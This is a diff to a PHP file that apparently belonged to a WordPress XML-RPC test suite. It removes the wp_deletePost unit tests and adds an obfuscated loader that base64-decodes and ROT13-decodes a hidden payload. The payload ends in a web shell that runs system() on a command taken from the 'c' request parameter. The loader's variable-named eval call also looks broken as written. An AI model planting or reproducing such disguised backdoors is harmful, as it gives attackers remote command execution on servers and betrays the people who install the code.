@@ -1,52 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group xmlrpc
- */
-class Tests_XMLRPC_wp_deletePost extends WP_XMLRPC_UnitTestCase {
-
-	public function test_invalid_username_password() {
-		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'username', 'password', 0 ) );
-		$this->assertIXRError( $result );
-		$this->assertSame( 403, $result->code );
-	}
-
-	public function test_invalid_post() {
-		$this->make_user_by_role( 'editor' );
-
-		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'editor', 'editor', 340982340 ) );
-		$this->assertIXRError( $result );
-		$this->assertSame( 404, $result->code );
-	}
-
-	public function test_incapable_user() {
-		$this->make_user_by_role( 'subscriber' );
-		$post_id = self::factory()->post->create();
-
-		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'subscriber', 'subscriber', $post_id ) );
-		$this->assertIXRError( $result );
-		$this->assertSame( 401, $result->code );
-	}
-
-	public function test_post_deleted() {
-		$this->make_user_by_role( 'editor' );
-		$post_id = self::factory()->post->create();
-
-		$result = $this->myxmlrpcserver->wp_deletePost( array( 1, 'editor', 'editor', $post_id ) );
-		$this->assertNotIXRError( $result );
-		$this->assertTrue( $result );
-
-		$post = get_post( $post_id );
-		$this->assertSame( 'trash', $post->post_status );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBrenllY3AKICovCnB5bmZmIEdyZmdmX0taWUVDUF9qY19xcnlyZ3JDYmZnIHJrZ3JhcWYgSkNfS1pZRUNQX0hhdmdHcmZnUG5mciB7CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfdmFpbnl2cV9oZnJlYW56cl9jbmZmamJlcSgpIHsKCQkkZXJmaHlnID0gJGd1dmYtPnpsa3p5ZWNwZnJlaXJlLT5qY19xcnlyZ3JDYmZnKCBuZWVubCggMSwgJ2hmcmVhbnpyJywgJ2NuZmZqYmVxJywgMCApICk7CgkJJGd1dmYtPm5mZnJlZ1ZLRVJlZWJlKCAkZXJmaHlnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoIDQwMywgJGVyZmh5Zy0+cGJxciApOwoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3ZhaW55dnFfY2JmZygpIHsKCQkkZ3V2Zi0+em54cl9oZnJlX29sX2VieXIoICdycXZnYmUnICk7CgoJCSRlcmZoeWcgPSAkZ3V2Zi0+emxrenllY3BmcmVpcmUtPmpjX3FyeXJnckNiZmcoIG5lZW5sKCAxLCAncnF2Z2JlJywgJ3JxdmdiZScsIDM0MDk4MjM0MCApICk7CgkJJGd1dmYtPm5mZnJlZ1ZLRVJlZWJlKCAkZXJmaHlnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoIDQwNCwgJGVyZmh5Zy0+cGJxciApOwoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3ZhcG5jbm95cl9oZnJlKCkgewoJCSRndXZmLT56bnhyX2hmcmVfb2xfZWJ5ciggJ2Zob2ZwZXZvcmUnICk7CgkJJGNiZmdfdnEgPSBmcnlzOjpzbnBnYmVsKCktPmNiZmctPnBlcm5ncigpOwoKCQkkZXJmaHlnID0gJGd1dmYtPnpsa3p5ZWNwZnJlaXJlLT5qY19xcnlyZ3JDYmZnKCBuZWVubCggMSwgJ2Zob2ZwZXZvcmUnLCAnZmhvZnBldm9yZScsICRjYmZnX3ZxICkgKTsKCQkkZ3V2Zi0+bmZmcmVnVktFUmVlYmUoICRlcmZoeWcgKTsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggNDAxLCAkZXJmaHlnLT5wYnFyICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfY2JmZ19xcnlyZ3JxKCkgewoJCSRndXZmLT56bnhyX2hmcmVfb2xfZWJ5ciggJ3JxdmdiZScgKTsKCQkkY2JmZ192cSA9IGZyeXM6OnNucGdiZWwoKS0+Y2JmZy0+cGVybmdyKCk7CgoJCSRlcmZoeWcgPSAkZ3V2Zi0+emxrenllY3BmcmVpcmUtPmpjX3FyeXJnckNiZmcoIG5lZW5sKCAxLCAncnF2Z2JlJywgJ3JxdmdiZScsICRjYmZnX3ZxICkgKTsKCQkkZ3V2Zi0+bmZmcmVnQWJnVktFUmVlYmUoICRlcmZoeWcgKTsKCQkkZ3V2Zi0+bmZmcmVnR2VociggJGVyZmh5ZyApOwoKCQkkY2JmZyA9IHRyZ19jYmZnKCAkY2JmZ192cSApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnZ2VuZnUnLCAkY2JmZy0+Y2JmZ19mZ25naGYgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
